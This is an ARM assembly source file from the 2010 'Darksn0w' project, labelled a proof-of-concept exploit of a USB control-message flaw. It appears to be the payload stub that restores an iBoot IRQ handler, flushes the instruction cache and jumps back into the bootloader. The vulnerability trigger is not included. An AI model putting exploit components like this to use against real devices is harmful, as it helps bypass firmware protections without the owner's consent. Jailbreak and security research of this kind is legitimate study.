 /*
  * Darksn0w - entry.S
  * Copyright (C) 2010 Joshua Lee Tucker
  *
  * **************************************
  * PoC usb_control_msg(0x21, 2) exploit
  * **************************************
  *
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * (at your option) any later version.
  *
  * This program is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  * GNU General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */

.arm
.text
_start:
.global _start

@--------------------------------
@-- Exploit Specific Variables --

.equ IRQ_HANDLER, 0x18017920 @ taken from offset 0x38 in iBoot
.equ IRQ_VECTOR, 0x00000038 @ pseudo-IRQ vector

@--------------------------------
  
  @ Restore IRQ Handler
  
  LDR R0, =IRQ_HANDLER
  LDR R1, =IRQ_VECTOR
  STR R0, [R1]
  
  NOP
  NOP
  NOP
  MOV R0, #0 
  MCR p15, 0, r0, c7, c5
  NOP
  NOP
  NOP
  
  LDR PC, =IRQ_HANDLER

			
